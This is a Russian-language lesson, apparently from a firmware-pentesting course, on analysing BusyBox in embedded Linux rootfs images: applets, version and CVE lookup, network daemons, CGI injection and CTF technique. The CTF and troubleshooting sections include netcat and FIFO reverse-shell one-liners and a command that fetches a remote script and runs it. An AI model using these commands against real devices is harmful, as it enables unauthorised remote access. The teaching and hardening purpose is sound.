## Вопрос, с которого всё начинается

В прошлом уроке мы распаковали rootfs встраиваемого Linux и увидели, что почти все команды — это один и тот же файл. Как такое возможно? И почему это важно для пентеста?

Ответ — **BusyBox**: один статический бинарник, который через симлинки притворяется сотней разных команд. Вопрос урока: как его читать и где в нём искать слабости?

## Наш пример: rootfs с BusyBox

У нас на руках распакованный rootfs роутера. Посмотрим на «стандартные» команды:

```bash
$ ls -l bin/ls bin/cat bin/sh
lrwxrwxrwx 1 root root 7 bin/ls -> busybox
lrwxrwxrwx 1 root root 7 bin/cat -> busybox
lrwxrwxrwx 1 root root 7 bin/sh -> busybox
```

`ls`, `cat`, `sh` — все симлинки на один `busybox`. Значит, вся «пользовательская обвязка» системы — это он.

## Шаг 1: как BusyBox понимает, кем быть

Секрет в `argv[0]` — имени, под которым программу запустили. BusyBox смотрит на него и решает, какую команду выполнить. Поэтому в rootfs сотни симлинков, а реальный код — один.

Каждая такая встроенная команда называется **applet**. Получить их список — значит получить карту возможностей системы:

```bash
$ ./bin/busybox --list
[, [[, ash, cat, chmod, cp, date, dd, df, ...
```

Если нужной команды нет, её роль играет другой applet: `ip` вместо `ifconfig`, `wget` вместо `curl`.

## Шаг 2: версия — это ключ к уязвимостям

Версия печатается при запуске без аргументов и находится в бинарнике строкой:

```bash
$ strings bin/busybox | grep -m1 'BusyBox v'
BusyBox v1.19.4 (2014-04-01)
```

`v1.19.4` — 2014 год. Старые версии содержат известные CVE (в `ash`, в разборе DHCP, в `wget`), поэтому это сразу кандидат на эксплуатацию, если демон доступен по сети. Проверим по базе:

```bash
$ searchsploit busybox | head
```

BusyBox собирается из `.config`. Если производитель выложил исходники (GPL), там будет точный список включённых applets и патчи — а патчи часто и скрывают «фичи».

## Шаг 3: ash — shell, который тоже может подвести

`ash` — облегчённый POSIX-shell, который BusyBox отдаёт как `/bin/sh`. Он поддерживает не всё, что bash: `[[ ]]` в полном объёме нет, арифметика ограничена. Для анализа скриптов инициализации это даже удобнее — синтаксис проще.

```bash
$ readlink -f /bin/sh
/bin/busybox
```

Опасность: `ash` исторически имел уязвимости (обработка переменных окружения, переполнения при разборе). Если на устройстве данные попадают в shell (CGI, `system()` в демонах), уязвимость ash даёт RCE.

## Шаг 4: встроенные сетевые сервисы

BusyBox включает мини-демоны, которые часто включены в прошивках:

| Applet | Назначение | Риск |
|--------|-----------|------|
| `httpd` | веб-сервер | отдача файлов, CGI |
| `telnetd` | telnet-демон | открытый shell без шифрования |
| `ftpd` | FTP | анонимный доступ |
| `wget` | загрузка | SSRF, загрузка payload |
| `nc` | netcat | реверс-шелл |
| `crond` | cron | скрытая периодическая задача |

Если `telnetd` запущен без пароля — это мгновенный root. Проверим, что включено:

```bash
$ ./bin/busybox --list | grep -E 'telnetd|httpd|ftpd|nc'
httpd
telnetd
nc
$ grep -rE 'telnetd|httpd|ftpd' etc/ | head
etc/init.d/rcS: telnetd -l /bin/sh
```

`telnetd -l /bin/sh` — это shell по сети **без аутентификации**. Вот и точка входа.

## Шаг 5: CGI — command injection

BusyBox `httpd` вызывает CGI-скрипты через shell. Если параметры не экранированы, получаем command injection. Проверим, есть ли веб-интерфейс:

```bash
$ ls www/cgi-bin 2>/dev/null
$ file www/cgi-bin/* 2>/dev/null
```

Класс уязвимостей:

- **CGI-инъекции** — неэкранированные параметры в shell.
- **Неправильные права** — `httpd` с доступом к `/` отдаёт всю ФС.
- **Path traversal** в старых версиях `httpd`.
- **Переполнения в applets** — `ash`, `wget`, разбор DHCP/ARP.

## Шаг 6: BusyBox в CTF — быстрые приёмы

В задачах BusyBox встречается постоянно:

- **Проверка версии** через `strings` и `--list` — мгновенная карта системы.
- **Встроенный `nc`** — реверс-шелл одной строкой.
- **`wget`** — загрузка payload без curl.
- **`httpd -h /`** — если запущен так, отдаёт всю ФС.

```bash
$ nc 10.10.14.1 4444 -e /bin/sh
$ wget -qO- http://10.10.14.1/a.sh | sh
```

Помните: флаги урезаны. `-e` у `nc` требует сборки с `CONFIG_NC_EXTRA`.

## Шаг 7: Toybox и альтернативы

`Toybox` — современная замена BusyBox (используется в Android). `coreutils` — полный набор для десктопа. Определить набор можно по `--list` и строке версии:

| Набор | Особенности |
|-------|-------------|
| BusyBox | самый распространённый, GPLv2 |
| Toybox | BSD-лицензия, Android |
| coreutils | полный набор, большой размер |

BusyBox удобно запускать и локально, чтобы проверить поведение applet'ов (если архитектура совпадает):

```bash
$ qemu-arm -L /usr/arm-linux-gnueabi ./busybox ls
$ ./busybox wget --help
```

Для статических бинарников это работает «из коробки», для динамических нужен правильный `ld.so`. Отладка в Ghidra/radare2 требует символов, но BusyBox часто собран stripped — тогда опирайтесь на строки сообщений об ошибках и известную версию.

## Что мы теперь знаем

1. BusyBox — один бинарник, который по `argv[0]` притворяется сотней команд (applets).
2. `busybox --list` даёт карту команд; версия — ключ к известным CVE.
3. `ash` — его shell; исторически уязвим, опасен при передаче данных в shell.
4. Встроенные демоны (`telnetd`, `httpd`, `ftpd`, `nc`) — частые точки входа.
5. `httpd` с CGI вызывает shell → command injection; неправильные права отдают всю ФС.
6. Toybox/coreutils — альтернативные наборы; определяются по `--list`.

## На что смотреть дальше

- **Флаги отличаются.** BusyBox-команды урезаны: `ls -Z`, `cp -a` могут отсутствовать.
- **`readlink` не решает симлинки рекурсивно** без флага.
- **Статический бинарник.** Не требует libc, но и не покажет зависимости.
- **Разные версии в одной прошивке.** Бывает несколько busybox.
- **`--list` не работает** в очень старых сборках — тогда `strings`.

## Шаг 8: читаем .config и патчи производителя

`--list` показывает, что собрано, но не показывает, как. Точный ответ даёт `.config` из GPL-исходников производителя: это файл, где каждая строка вида `CONFIG_<APP>_<ФИЧА>=y` включает конкретную возможность.

```bash
$ grep -E '^CONFIG_(TELNETD|HTTPD|WGET|NC_EXTRA|ASH)' .config
CONFIG_TELNETD=y
CONFIG_HTTPD=y
CONFIG_WGET=y
# CONFIG_NC_EXTRA is not set
CONFIG_ASH=y
```

Читается это так: `telnetd` и `httpd` включены (значит, их могут запустить), а `CONFIG_NC_EXTRA` **не** установлен — поэтому у встроенного `nc` не будет флага `-e` для запуска команды. Такой разбор экономит время: вместо перебора флагов вы сразу видите, что доступно, а что вырезано.

Отдельно сравнивают патчи производителя с ванильным BusyBox: иногда вендор правит `httpd` или `wget`, и «фича» оказывается backdoor'ом. Достаточно `diff` между исходниками вендора и upstream.

## Шаг 9: BusyBox в CTF — типовой разбор

В задачах прошивку распаковывают (`binwalk -e`), находят `busybox` и читают конфигурацию:

```bash
$ file bin/busybox
bin/busybox: ELF 32-bit LSB executable, ARM, EABI5, statically linked, stripped
$ strings -n 5 bin/busybox | grep -iE 'v1\.[0-9]+|CONFIG_' | head
```

`statically linked` объясняет, почему бинарник запускается сам по себе, `stripped` — почему в нём нет имён функций. Дальше `strings` даёт версию и подсказки о сборке, а `grep -r telnetd etc/` — стартовые скрипты. Цепочка «версия → CVE → демон → точка входа» проходится за минуты.

## Если не сработало

- **`--list` молчит или выдаёт ошибку.** Очень старая сборка без этой фичи — используйте `strings` и ищите имена applet'ов в бинарнике.
- **Симлинк ведёт «в никуда».** `bin/ls -> busybox`, но самого файла `busybox` нет — вы распаковали неполный rootfs; проверьте наличие бинарника.
- **`nc -e` не работает.** Флаг вырезан (`CONFIG_NC_EXTRA`); используйте FIFO-трюк: `rm -f f; mkfifo f; nc host port < f | /bin/sh > f 2>&1`.
- **Демон «не найден», хотя applet есть.** Applet скомпилирован, но не запущен — ищите вызов в `etc/init.d/`, `etc/rc.d/`, `rcS`.

## Как защититься

- Собирать BusyBox без ненужных демонов (`telnetd`, `ftpd`) — выключать их в `.config`.
- Никогда не запускать `telnetd` без пароля и без привязки к интерфейсу.
- Обновлять версию: релизы 2010-х годов содержат публичные CVE.
- Не отдавать `httpd` корень ФС и экранировать данные, попадающие в CGI-shell.

## Куда дальше

Мы получили карту возможностей системы. Но если UART закрыт и shell нет — как попасть внутрь? В следующем уроке разберём JTAG и SWD: аппаратную отладку, которая даёт доступ к ядру процессора и позволяет снять дамп памяти в обход всего. А пока главное: **BusyBox — это вся система в одном файле, и читать его надо первым.**
